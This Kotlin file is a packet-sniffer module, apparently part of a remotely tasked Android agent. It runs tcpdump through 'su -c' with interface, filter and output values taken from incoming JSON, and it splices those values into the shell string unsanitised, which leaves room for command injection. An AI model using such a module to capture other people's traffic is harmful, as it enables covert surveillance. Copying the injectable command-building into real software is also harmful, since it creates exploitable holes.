package com.redchain.agent.modules

import org.json.JSONObject

/**
 * Network Packet Sniffer
 * Capture network traffic for analysis
 *
 * NOTE: Requires ROOT access for pcap
 * Alternative: Use VPN Service for non-root packet inspection
 */
object PacketSnifferModule {

    /**
     * Start packet capture using tcpdump (requires root)
     */
    fun startCapture(params: JSONObject): JSONObject {
        val result = JSONObject()

        try {
            // Check if device is rooted
            val isRooted = checkRoot()

            if (!isRooted) {
                result.put("status", "error")
                result.put("message", "Root access required for packet sniffing")
                result.put("alternative", "Use VPN Service for non-root traffic inspection")
                return result
            }

            // Start tcpdump if root available
            val interface = params.optString("interface", "wlan0")
            val filter = params.optString("filter", "")
            val output = params.optString("output", "/sdcard/capture.pcap")

            val command = buildString {
                append("tcpdump")
                append(" -i $interface")
                if (filter.isNotEmpty()) {
                    append(" $filter")
                }
                append(" -w $output")
            }

            // Execute command
            Runtime.getRuntime().exec(arrayOf("su", "-c", command))

            result.put("status", "started")
            result.put("command", command)
            result.put("output_file", output)

        } catch (e: Exception) {
            result.put("status", "error")
            result.put("error", e.message)
        }

        return result
    }

    private fun checkRoot(): Boolean {
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "id"))
            val output = process.inputStream.bufferedReader().readText()
            output.contains("uid=0")
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Alternative: VPN-based traffic monitoring (no root required)
     */
    fun setupVpnMonitoring(): JSONObject {
        return JSONObject().apply {
            put("status", "not_implemented")
            put("message", "VPN Service can be used for non-root packet inspection")
            put("note", "Requires VpnService implementation")
        }
    }
}
